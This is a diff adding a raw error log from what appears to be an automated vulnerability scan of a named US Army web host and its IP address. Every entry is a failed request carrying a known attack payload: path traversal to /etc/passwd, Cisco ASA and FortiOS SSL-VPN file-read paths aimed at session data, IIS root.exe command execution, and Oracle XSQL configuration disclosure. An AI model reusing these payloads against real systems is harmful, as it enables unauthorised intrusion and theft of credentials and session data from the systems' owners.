@@ -1,0 +1,20 @@
+
+[21-04-10 17:42:54] - uastc.cvs.ellc.learn.army.mil/ - %2e%2e;/test - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:42:55] - uastc.cvs.ellc.learn.army.mil/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:42:55] - uastc.cvs.ellc.learn.army.mil/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:42:55] - uastc.cvs.ellc.learn.army.mil/ - ..;/ - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:43:28] - uastc.cvs.ellc.learn.army.mil/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:44:23] - uastc.cvs.ellc.learn.army.mil/ - etc/passwd - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:44:47] - uastc.cvs.ellc.learn.army.mil/ - msdac/root.exe?/c+dir - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:45:08] - uastc.cvs.ellc.learn.army.mil/ - scripts/root.exe?/c+dir - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:45:23] - uastc.cvs.ellc.learn.army.mil/ - text-base/etc/passwd - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-10 17:45:45] - uastc.cvs.ellc.learn.army.mil/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - There was a problem in the request to: http://214.48.252.83:80/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+[21-04-10 17:45:46] - uastc.cvs.ellc.learn.army.mil/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - There was a problem in the request to: http://214.48.252.83:80/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
+[21-04-10 17:45:50] - uastc.cvs.ellc.learn.army.mil/ - servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - There was a problem in the request to: http://214.48.252.83:80/servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
+[21-04-10 17:45:50] - uastc.cvs.ellc.learn.army.mil/ - servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - There was a problem in the request to: http://214.48.252.83:80/servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
+[21-04-10 17:45:50] - uastc.cvs.ellc.learn.army.mil/ - servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml - There was a problem in the request to: http://214.48.252.83:80/servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
+[21-04-10 17:45:52] - uastc.cvs.ellc.learn.army.mil/ - servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml - There was a problem in the request to: http://214.48.252.83:80/servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
+[21-04-10 17:45:57] - uastc.cvs.ellc.learn.army.mil/ - soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - There was a problem in the request to: http://214.48.252.83:80/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
+[21-04-10 17:46:06] - uastc.cvs.ellc.learn.army.mil/ - userinfo.aspx - There was a problem in the request to: http://214.48.252.83:80/userinfo.aspx
+[21-04-10 17:46:50] - uastc.cvs.ellc.learn.army.mil/ - webstats/ - There was a problem in the request to: http://214.48.252.83:80/webstats/
+[21-04-10 17:47:21] - uastc.cvs.ellc.learn.army.mil/ - xsql/lib/XSQLConfig.xml - There was a problem in the request to: http://214.48.252.83:80/xsql/lib/XSQLConfig.xml
